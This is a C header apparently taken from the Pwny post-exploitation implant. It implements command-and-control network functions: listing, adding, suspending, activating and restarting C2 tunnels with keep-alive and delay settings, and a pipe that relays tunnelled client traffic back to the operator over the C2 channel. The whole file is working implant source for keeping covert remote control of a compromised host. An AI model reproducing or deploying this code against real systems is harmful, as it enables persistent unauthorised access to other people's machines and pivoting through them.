/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _NET_H_
#define _NET_H_

#include <pwny/api.h>
#include <pwny/c2.h>
#include <pwny/tlv.h>
#include <pwny/core.h>
#include <pwny/pipe.h>
#include <pwny/tlv_types.h>

#define NET_BASE 4

#define NET_TUNNELS \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       NET_BASE, \
                       API_CALL)
#define NET_ADD_TUNNEL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       NET_BASE, \
                       API_CALL + 1)
#define NET_SUSPEND_TUNNEL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       NET_BASE, \
                       API_CALL + 2)
#define NET_ACTIVATE_TUNNEL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       NET_BASE, \
                       API_CALL + 3)
#define NET_RESTART_TUNNEL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       NET_BASE, \
                       API_CALL + 4)
#define NET_GET_TUNNEL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       NET_BASE, \
                       API_CALL + 5)

#define NET_CLIENT_PIPE \
        TLV_PIPE_CUSTOM(PIPE_STATIC, \
                        NET_BASE, \
                        PIPE_TYPE)

#define TLV_TYPE_TUNNEL_URI    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, NET_BASE, API_TYPE)

#define TLV_TYPE_TUNNEL_ALGO       TLV_TYPE_CUSTOM(TLV_TYPE_INT, NET_BASE, API_TYPE)
#define TLV_TYPE_TUNNEL_ID         TLV_TYPE_CUSTOM(TLV_TYPE_INT, NET_BASE, API_TYPE + 1)
#define TLV_TYPE_TUNNEL_DELAY      TLV_TYPE_CUSTOM(TLV_TYPE_INT, NET_BASE, API_TYPE + 2)
#define TLV_TYPE_TUNNEL_KEEP_ALIVE TLV_TYPE_CUSTOM(TLV_TYPE_INT, NET_BASE, API_TYPE + 3)

static tlv_pkt_t *net_tunnels(c2_t *c2)
{
    /* List current active network tunnels.
     *
     * :out tlv(TLV_TYPE_GROUP): list of tunnels
     *      :member u32(TLV_TYPE_TUNNEL_ID): tunnel ID
     *      :member u32(TLV_TYPE_TUNNEL_ALGO): encryption algorithm ID
     *      :member string(TLV_TYPE_TUNNEL_URI): tunnel URI
     *      :member u32(TLV_TYPE_BOOL): is current tunnel
     *      :member u32(TLV_TYPE_INT): is active or suspended
     *      :member u32(TLV_TYPE_TUNNEL_KEEP_ALIVE): should be kept alive after exit or not
     *      :member u32(TLV_TYPE_TUNNEL_DELAY): keep alive delay
     *
     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS / API_CALL_FAIL
     *
     */

    c2_t *curr_c2;
    c2_t *c2_tmp;
    core_t *core;
    tlv_pkt_t *result;
    tlv_pkt_t *tunnel;

    core = c2->data;
    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    HASH_ITER(hh, core->c2, curr_c2, c2_tmp)
    {
        tunnel = tlv_pkt_create();

        tlv_pkt_add_u32(tunnel, TLV_TYPE_TUNNEL_ID, curr_c2->id);
        tlv_pkt_add_u32(tunnel, TLV_TYPE_TUNNEL_ALGO, curr_c2->crypt->algo);
        tlv_pkt_add_string(tunnel, TLV_TYPE_TUNNEL_URI, curr_c2->tunnel->uri);

        if (curr_c2->id == c2->id)
        {
            tlv_pkt_add_u32(tunnel, TLV_TYPE_BOOL, 1);
        }
        else
        {
            tlv_pkt_add_u32(tunnel, TLV_TYPE_BOOL, 0);
        }

        tlv_pkt_add_u32(tunnel, TLV_TYPE_INT, curr_c2->tunnel->active);
        tlv_pkt_add_u32(tunnel, TLV_TYPE_TUNNEL_KEEP_ALIVE, curr_c2->tunnel->keep_alive);
        tlv_pkt_add_u32(tunnel, TLV_TYPE_TUNNEL_DELAY, (int)curr_c2->tunnel->delay);

        tlv_pkt_add_tlv(result, TLV_TYPE_GROUP, tunnel);
        tlv_pkt_destroy(tunnel);
    }

    return result;
}

tlv_pkt_t *net_add_tunnel(c2_t *c2)
{
    /* Add new network tunnel.
     *
     * :in string(TLV_TYPE_TUNNEL_URI): new tunnel URI
     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS / API_CALL_FAIL
     *
     */

    core_t *core;
    char uri[256];

    core = c2->data;

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_TUNNEL_URI, uri) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (core_add_uri(core, uri) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

tlv_pkt_t *net_suspend_tunnel(c2_t *c2)
{
    /* Suspend network tunnel by ID.
     *
     * :in u32(TLV_TYPE_TUNNEL_ID): tunnel ID
     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS / API_CALL_FAIL
     *
     */

    core_t *core;
    c2_t *curr_c2;
    c2_t *c2_tmp;
    int id;

    core = c2->data;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_TUNNEL_ID, &id) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (id == c2->id)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    HASH_ITER(hh, core->c2, curr_c2, c2_tmp)
    {
        if (curr_c2->id != id || !curr_c2->tunnel->active)
        {
            continue;
        }

        c2_stop(curr_c2);
        break;
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

tlv_pkt_t *net_activate_tunnel(c2_t *c2)
{
    /* Activate network tunnel by ID.
     *
     * :in u32(TLV_TYPE_TUNNEL_ID): tunnel ID
     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS / API_CALL_FAIL
     *
     */

    core_t *core;
    c2_t *curr_c2;
    c2_t *c2_tmp;
    int id;

    core = c2->data;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_TUNNEL_ID, &id) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    HASH_ITER(hh, core->c2, curr_c2, c2_tmp)
    {
        if (curr_c2->id != id || curr_c2->tunnel->active)
        {
            continue;
        }

        c2_start(curr_c2);
        break;
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static void update_tunnel(struct eio_req *request)
{
    c2_t *c2;
    c2_t *curr_c2;
    c2_t *c2_tmp;
    core_t *core;

    int id;
    int delay;
    int keep_alive;
    int found;
    int status;

    found = 0;

    char uri[256];

    c2 = request->data;
    core = c2->data;

    status = tlv_pkt_get_u32(c2->request, TLV_TYPE_TUNNEL_ID, &id);

    if (status == -1)
    {
        goto fail;
    }

    HASH_ITER(hh, core->c2, curr_c2, c2_tmp)
    {
        if (curr_c2->id != id)
        {
            continue;
        }

        c2->response = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
        c2_enqueue_tlv(c2, c2->response);
        found = 1;

        tunnel_stop(curr_c2->tunnel);
        status = tlv_pkt_get_u32(c2->request, TLV_TYPE_TUNNEL_DELAY, &delay);

        if (status != -1)
        {
            curr_c2->tunnel->delay = (float)delay;
            log_debug("* Delay: %f | %s\n", curr_c2->tunnel->delay, curr_c2->tunnel->uri);
        }

        status = tlv_pkt_get_u32(c2->request, TLV_TYPE_TUNNEL_KEEP_ALIVE, &keep_alive);

        if (status != -1)
        {
            curr_c2->tunnel->keep_alive = keep_alive;
        }

        status = tlv_pkt_get_string(c2->request, TLV_TYPE_TUNNEL_URI, uri);

        if (status != -1)
        {
            free(curr_c2->tunnel->uri);
            tunnel_set_uri(curr_c2->tunnel, uri);
        }

        tunnel_start(curr_c2->tunnel);
        break;
    }

    if (!found)
    {
        goto fail;
    }

    goto finalize;

fail:
    c2->response = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    c2_enqueue_tlv(c2, c2->response);

finalize:
    tlv_pkt_destroy(c2->request);
    tlv_pkt_destroy(c2->response);
}

tlv_pkt_t *net_restart_tunnel(c2_t *c2)
{
    /* Restart and update network tunnel configuration by ID.
     *
     * :in u32(TLV_TYPE_TUNNEL_ID): tunnel ID
     * :in u32(TLV_TYPE_TUNNEL_DELAY): new tunnel keep alive delay
     * :in u32(TLV_TYPE_TUNNEL_KEEP_ALIVE): toggle keep alive
     * :in string(TLV_TYPE_TUNNEL_URI): new tunnel URI
     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS / API_CALL_FAIL
     *
     */

    eio_custom(update_tunnel, 0, NULL, c2);
    return NULL;
}

void net_client_event_link(int event, void *data)
{
    pipe_t *pipe;
    tlv_pkt_t *result;

    pipe = data;
    result = api_craft_tlv_pkt(API_CALL_SUCCESS, NULL);

    log_debug("* Connected!!! %d\n", event);

    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, NET_CLIENT_PIPE);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, pipe->id);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_HEARTBEAT, event);

    c2_enqueue_tlv(pipe->c2, result);
    tlv_pkt_destroy(result);
}

void net_client_read_link(void *data)
{
    pipe_t *pipe;
    size_t length;
    tunnel_t *tunnel;
    tlv_pkt_t *result;
    unsigned char *buffer;

    pipe = data;
    tunnel = pipe->data;
    length = tunnel->ingress->bytes;

    buffer = malloc(length);
    if (buffer == NULL)
    {
        return;
    }

    queue_remove(tunnel->ingress, buffer, length);
    result = api_craft_tlv_pkt(API_CALL_SUCCESS, NULL);

    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, NET_CLIENT_PIPE);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, pipe->id);
    tlv_pkt_add_bytes(result, TLV_TYPE_PIPE_BUFFER, buffer, length);

    c2_enqueue_tlv(pipe->c2, result);

    tlv_pkt_destroy(result);
    free(buffer);
}

static int net_client_create(pipe_t *pipe, c2_t *c2)
{
    char uri[256];
    tunnels_t *tunnel;
    tunnel_t *ctx;
    core_t *core;

    core = c2->data;
    tlv_pkt_get_string(c2->request, TLV_TYPE_TUNNEL_URI, uri);

    tunnel = tunnel_find(core->tunnels, uri);
    if (tunnel == NULL)
    {
        log_debug("* Failed to find protocol for (%s)\n", uri);
        return -1;
    }

    ctx = tunnel_create(tunnel);
    if (ctx == NULL)
    {
        log_debug("* Failed to create tunnel for C2 (%d)\n", c2->id);
        return -1;;
    }

    tunnel_set_uri(ctx, uri);
    tunnel_setup(ctx, c2->loop);

    if (pipe->flags & PIPE_INTERACTIVE)
    {
        tunnel_set_links(ctx, net_client_read_link, NULL,
                         net_client_event_link, pipe);
    }
    else
    {
        tunnel_set_links(ctx, NULL, NULL, NULL, pipe);
    }

    if (tunnel_init(ctx) < 0)
    {
        log_debug("* Failed to initialize tunnel for C2 (%d)\n", c2->id);
        return -1;
    }

    tunnel_start(ctx);
    pipe->data = ctx;
    pipe->c2 = c2;
    return 0;
}

static int net_client_tell(pipe_t *pipe)
{
    tunnel_t *tunnel;

    tunnel = pipe->data;
    return tunnel->ingress->bytes;
}

static int net_client_read(pipe_t *pipe, void *buffer, int length)
{
    tunnel_t *tunnel;

    tunnel = pipe->data;
    return queue_remove(tunnel->ingress, buffer, length);
}

static int net_client_write(pipe_t *pipe, void *buffer, int length)
{
    tunnel_t *tunnel;

    tunnel = pipe->data;
    queue_add_raw(tunnel->egress, buffer, length);
    tunnel_write(tunnel, tunnel->egress);

    return 0;
}

static int net_client_destroy(pipe_t *pipe, c2_t *c2)
{
    tunnel_t *tunnel;

    tunnel = pipe->data;

    tunnel_stop(tunnel);
    tunnel_exit(tunnel);
    tunnel_free(tunnel);

    return 0;
}

static tlv_pkt_t *net_get_tunnel(c2_t *c2)
{
    /* Retrieve current network tunnel configuration.
     *
     * :out u32(TLV_TYPE_TUNNEL_ID): current tunnel ID
     * :out u32(TLV_TYPE_TUNNEL_ALGO): current tunnel encryption algorithm ID
     * :out u32(TLV_TYPE_TUNNEL_DELAY): current tunnel keep alive delay
     * :out u32(TLV_TYPE_TUNNEL_KEEP_ALIVE): is keep alive or not
     * :out string(TLV_TYPE_TUNNEL_URI): current tunnel URI
     * :out u32(TLV_TYPE_INT): is current tunnel active (it should be!)
     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS
     *
     */

    tlv_pkt_t *result;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    tlv_pkt_add_u32(result, TLV_TYPE_TUNNEL_ID, c2->id);
    tlv_pkt_add_u32(result, TLV_TYPE_TUNNEL_ALGO, c2->crypt->algo);
    tlv_pkt_add_string(result, TLV_TYPE_TUNNEL_URI, c2->tunnel->uri);

    tlv_pkt_add_u32(result, TLV_TYPE_INT, c2->tunnel->active);
    tlv_pkt_add_u32(result, TLV_TYPE_TUNNEL_KEEP_ALIVE, c2->tunnel->keep_alive);
    tlv_pkt_add_u32(result, TLV_TYPE_TUNNEL_DELAY, (int)c2->tunnel->delay);

    return result;
}

void register_net_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, NET_TUNNELS, net_tunnels);
    api_call_register(api_calls, NET_ADD_TUNNEL, net_add_tunnel);
    api_call_register(api_calls, NET_SUSPEND_TUNNEL, net_suspend_tunnel);
    api_call_register(api_calls, NET_ACTIVATE_TUNNEL, net_activate_tunnel);
    api_call_register(api_calls, NET_RESTART_TUNNEL, net_restart_tunnel);
    api_call_register(api_calls, NET_GET_TUNNEL, net_get_tunnel);
}

void register_net_api_pipes(pipes_t **pipes)
{
    pipe_callbacks_t client_callbacks;

    client_callbacks.create_cb = net_client_create;
    client_callbacks.read_cb = net_client_read;
    client_callbacks.write_cb = net_client_write;
    client_callbacks.tell_cb = net_client_tell;
    client_callbacks.destroy_cb = net_client_destroy;

    api_pipe_register(pipes, NET_CLIENT_PIPE, client_callbacks);
}

#endif
